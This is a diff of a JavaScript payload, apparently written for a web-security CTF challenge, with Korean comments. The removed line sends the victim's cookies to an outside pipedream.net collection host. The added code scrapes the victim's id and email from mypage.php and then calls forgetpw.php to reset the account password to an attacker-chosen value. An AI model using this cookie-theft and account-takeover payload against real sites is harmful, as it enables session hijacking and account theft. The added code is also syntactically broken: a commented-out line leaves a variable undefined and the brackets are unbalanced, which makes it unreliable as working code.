@@ -1,3 +1,43 @@
 <script>
-  fetch('https://enkrh6wtq3yz.x.pipedream.net/?cookie='+document.cookie);
+    fetch('http://ctf.segfaulthub.com:4498/mypage.php') //mypage.php에 접근하여 id, email 값 추출
+        .then(response => response.text())
+        //.then(html => {
+        let parser = new DOMParser();
+        let doc = parser.parseFromString(html, 'text/html');
+        let id1 = doc.getElementsByTagName('td')[2].textContent; //id 값 추출
+        let email = doc.getElementsByName('email')[0].placeholder; //email 값 추출
+    
+        let formData = new URLSearchParams(); 
+        formData.append('id', id1); 
+        formData.append('email', email);
+        
+        fetch('http://ctf.segfaulthub.com:4498/forgetpw.php', { //forgetpw.php에 접근하여 이용자 구분 값 idx 추출
+        method: 'POST',
+        headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: formData.toString()
+        })
+            .then(response => response.text())
+            .then(html => {
+            let parser = new DOMParser();
+            let doc2 = parser.parseFromString(html, 'text/html');
+            let idx = '129'; //이용자 구분 값 idx 추출
+            let newpass = 'bypass'; //공격자가 임의로 재설정할 비밀번호 값
+            let chkpass = 'bypass'; //비밀번호 확인 값
+
+            let formData = new URLSearchParams(); 
+            formData.append('pw', newpass); 
+            formData.append('repw', chkpass);
+            formData.append('idx', idx);
+            
+            fetch('http://ctf.segfaulthub.com:4498/forgetpw.php', { //forgetpw.php에 idx, pw, repw 로 비밀번호 변경 요청 전송
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData.toString()
+            })
+        })
+    })
 </script>
